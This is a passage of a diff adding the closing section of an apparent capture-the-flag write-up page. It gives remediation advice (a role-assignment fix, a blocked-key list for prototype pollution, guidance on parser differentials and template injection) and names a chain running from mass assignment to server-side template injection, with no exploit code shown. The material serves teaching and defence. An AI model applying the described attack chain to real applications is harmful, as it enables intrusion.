+const { email, password, role = "guest" } = req.body;
+
+// Fixed — role is never trusted from the client
+const { email, password } = req.body;
+const role = "guest";</code></pre>
+
+                <h3>Parser Differentials</h3>
+
+                <p>If <code>email-addresses</code> validates the input, extract the normalized canonical address from
+                    its parse result and use <em>only</em> that downstream. Never pass the raw string to a different
+                    parser that might interpret it differently.</p>
+
+                <h3>Sanitization Consistency</h3>
+
+                <p>Sanitization should live at the model layer — inside <code>BountyModel.create</code> and
+                    <code>BountyModel.update</code> — not selectively in individual route handlers. Centralizing it
+                    makes it impossible to forget.</p>
+
+                <h3>Prototype Pollution</h3>
+
+                <p>Block dangerous keys before processing any merge operation:</p>
+
+                <pre><code>const BLOCKED_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
+
+function safeMerge(target, source) {
+    for (let key in source) {
+        if (BLOCKED_KEYS.has(key)) continue;
+        // ... rest of merge logic
+    }
+}</code></pre>
+
+                <p>Alternatively, use <code>Object.create(null)</code> for configuration objects — these have no
+                    prototype chain and are immune to pollution.</p>
+
+                <h3>The needle Gadget</h3>
+
+                <p>Use <code>Object.create(null)</code> for options objects passed to third-party libraries, eliminating
+                    prototype chain lookups entirely:</p>
+
+                <pre><code>const options = Object.create(null);
+options.compressed = true;
+options.follow_max = 0;</code></pre>
+
+                <h3>SSTI Prevention</h3>
+
+                <p>Never allow user-controlled data to reach the filesystem in a location the template engine renders.
+                    Any file-write primitive — prototype pollution gadgets, path traversal, or SSRF — should be treated
+                    as critical in applications using server-side template engines.</p>
+
+                <h2 id="s10">10. Key Lessons</h2>
+
+                <p>The most important insight from this challenge is that vulnerabilities rarely exist in isolation.
+                    Every defensive measure in this application was applied <em>somewhere</em> — the sanitizer existed,
+                    the domain check worked correctly, the <code>file://</code> protocol was blocked. The attack
+                    succeeded because defenses were applied <strong>inconsistently</strong>, and because the
+                    intersections between components created emergent behavior no single component review would have
+                    caught.</p>
+
+                <p>Prototype pollution is particularly insidious in this regard. The vulnerability isn't in the code
+                    that gets exploited (needle), but in a completely unrelated part of the application (the merge
+                    function). A reviewer auditing needle usage in isolation would find nothing wrong. A reviewer
+                    auditing the merge function might spot the pollution but never imagine the needle gadget. Only a
+                    full data-flow analysis — tracing untrusted input through every system that subsequently handles it
+                    — reveals the complete picture.</p>
+
+                <p>The defensive principle that follows: treat <code>Object.prototype</code> as a security boundary.
+                    Validate that no untrusted data ever reaches it, the same way you'd protect SQL query construction
+                    or shell command assembly. Because once the prototype is poisoned, every object in the process
+                    becomes a potential weapon — and you'll never see it coming by looking at the victim code alone.</p>
+
+                <div class="pwned-banner">
+                    <span class="pwned-icon">🏴</span>
+                    <div class="pwned-text">Machine Pwned</div>
+                    <p class="pwned-sub">Mass Assignment → Parser Differential → Prototype Pollution → needle Gadget →
+                        SSTI → Flag captured</p>
+                </div>
+
+            </div>
+        </article>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Abdelaaziz Belkhair</p>
+        </div>
+    </footer>
+</body>
+
+</html>
